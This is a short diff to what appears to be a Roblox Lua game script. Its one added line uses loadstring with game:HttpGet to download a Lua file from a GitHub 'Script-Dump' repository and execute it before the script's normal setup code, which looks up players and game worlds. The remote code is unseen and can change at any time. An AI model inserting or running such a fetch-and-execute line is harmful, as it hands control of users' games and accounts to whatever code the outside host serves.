@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DohmBoyOG/Script-Dump/main/ZHZH0MIYKR.lua"))()
+
 local thisPlayer = game:GetService("Players").LocalPlayer
 local otherPlayer = game:GetService("Players")
 local worlds = game:GetService("Workspace").GameWorlds
